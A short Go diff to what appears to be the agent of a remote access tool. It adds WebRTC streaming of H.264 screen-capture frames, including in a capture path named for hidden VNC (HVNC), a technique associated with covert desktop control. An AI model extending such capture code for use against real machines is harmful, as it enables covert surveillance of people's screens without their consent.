@@ -19,6 +19,7 @@ import (
 	"time"
 
 	rt "overlord-client/cmd/agent/runtime"
+	"overlord-client/cmd/agent/webrtcpub"
 	"overlord-client/cmd/agent/wire"
 )
 
@@ -144,6 +145,21 @@ func CaptureAndSend(ctx context.Context, env *rt.Env) error {
 	}
 	frame.Header.FPS = fps
 	if ctx.Err() != nil {
+		return nil
+	}
+	if frame.Header.Format == "h264" && webrtcpub.IsActive() {
+		dur := time.Second / time.Duration(fps)
+		if dur <= 0 {
+			dur = 33 * time.Millisecond
+		}
+		if werr := webrtcpub.WriteH264(frame.Data, dur); werr != nil {
+			log.Printf("webrtc: write h264 failed: %v", werr)
+		}
+		statFrames.Add(1)
+		statCapNs.Add(captureDur.Nanoseconds())
+		statEncNs.Add(encodeDur.Nanoseconds())
+		statTotalNs.Add(time.Since(t0).Nanoseconds())
+		statBytes.Add(int64(len(frame.Data)))
 		return nil
 	}
 	if !AcquireFrameSlot() {
@@ -567,6 +583,9 @@ func buildFrame(img *image.RGBA, display int, quality int) (wire.Frame, time.Dur
 			log.Printf("capture: h264 skipped for odd dimensions (%dx%d), falling back to jpeg", width, height)
 			codec = "jpeg"
 		} else {
+			if webrtcpub.ConsumeKeyframeRequest() {
+				resetH264Encoder()
+			}
 			h264Bytes, err := encodeH264Frame(img)
 			if err == nil && len(h264Bytes) > 0 {
 				prevMu.Lock()
@@ -672,6 +691,9 @@ func buildFrameHVNC(img *image.RGBA, display int, quality int) (wire.Frame, time
 			log.Printf("hvnc capture: h264 skipped for odd dimensions (%dx%d), falling back to jpeg", width, height)
 			codec = "jpeg"
 		} else {
+			if webrtcpub.ConsumeKeyframeRequest() {
+				resetH264Encoder()
+			}
 			h264Bytes, err := encodeH264Frame(img)
 			if err == nil && len(h264Bytes) > 0 {
 				prevMu.Lock()
